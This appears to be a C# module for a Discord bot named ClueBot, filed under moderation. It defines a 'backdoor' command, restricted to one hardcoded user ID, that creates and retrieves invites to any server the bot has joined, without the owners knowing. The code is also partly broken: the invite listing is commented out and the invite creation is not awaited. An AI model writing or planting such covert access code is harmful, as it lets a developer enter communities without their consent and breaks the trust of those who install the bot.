using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System;
using System.Linq;
using System.Threading.Tasks;

namespace ClueBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            if (!(Context.User.Id == 177177029400199168))
            {
                await Context.Channel.SendMessageAsync("You don't appear to be a bot moderator...");
                return;
            }
            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync("I am not in a server with id: " + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                { 
                    Guild.TextChannels.First().CreateInviteAsync();
                }

                Invites = null;
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for server {Guild.Name}:", Guild.IconUrl);
                Embed.WithColor(55, 0, 255);
                //foreach (var Current in Invites)
                  //  Embed.AddInlineField("Invite: ", $"[Invite]({Current.Url})");

                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }

            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync($"Creating an invite for server {Guild.Name} went wrong with error: ``{ex.Message}``");
                return;
            }
        }
    }
}
